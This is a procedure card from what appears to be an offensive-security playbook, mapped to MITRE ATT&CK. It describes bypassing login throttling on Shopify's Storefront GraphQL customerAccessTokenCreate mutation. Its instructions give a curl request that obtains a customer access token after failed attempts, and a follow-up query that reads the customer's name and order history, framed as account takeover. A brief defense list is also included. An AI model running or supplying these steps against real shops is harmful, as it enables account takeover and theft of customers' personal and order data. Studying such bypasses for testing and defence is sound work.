---
id: proc-uuid-002
tags:
  - authentication-bypass
  - brute-force
  - graphql
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-valid-login]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:32:28.900Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Brute Force]]'
---
# Bypass-Throttle-with-Valid-Password

## Summary

This procedure demonstrates bypassing the activated throttle in Shopify's customerAccessTokenCreate mutation by submitting a valid password immediately after invalid attempts, resulting in successful authentication and potential account takeover.

## Description

Following the triggering of throttling via invalid logins, this step exploits the flaw where valid credentials are not subject to the same restrictions. In a brute force scenario, an attacker with partial credential knowledge (e.g., email and guessed password) can succeed despite recent failures. The target is the GraphQL API endpoint; success grants an access token for querying customer data like orders and contact info. Prerequisites: Active throttle from prior step and known valid credentials.

## Requirements

1. Confirmed active throttle from invalid attempts
2. Valid customer email and password
3. Access to the same StoreFront API endpoint
4. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Apply uniform throttling to all login attempts
- Log and alert on successful logins following failure bursts
- Enforce account lockouts after any suspicious activity

## Objectives

1. Authenticate successfully post-throttle
2. Obtain access token for account data
3. Expose vulnerability for brute force exploitation

## Instructions

### Step 1: Submit Valid Credentials Post-Throttle

**Context**: Use the same mutation with correct password to bypass the limit and gain access.

**Command** ([[commands/curl-valid-login]]):
```bash
curl -X POST https://target-store.myshopify.com/api/2023-01/graphql.json \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Storefront-Access-Token: your_token_here' \
  -d '{"query": "mutation customerAccessTokenCreate($input: CustomerAccessTokenCreateInput!) { customerAccessTokenCreate(input: $input) { customerAccessToken { accessToken } userErrors { field message } } }", "variables": {"input": {"email": "target@example.com", "password": "correctpass456"}}}'
```

> Response should return a valid accessToken in customerAccessToken, confirming bypass.

### Step 2: Verify Access with Token

**Context**: Use the obtained token to query customer data, validating full access.

**Command** ([[commands/curl-valid-login]]):
```bash
# Follow-up query: curl -X POST ... -d '{"query": "{ customer(accessToken: \"valid_token\") { firstName orders(first: 10) { edges { node { name } } } } }'}'
```

> Expected output: Customer details and order history, indicating successful takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Brute Force]] Brute Force

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-valid-login]]

## Tools Used

- None

## Tags

- [[authentication-bypass]]
- [[brute-force]]
- [[graphql]]
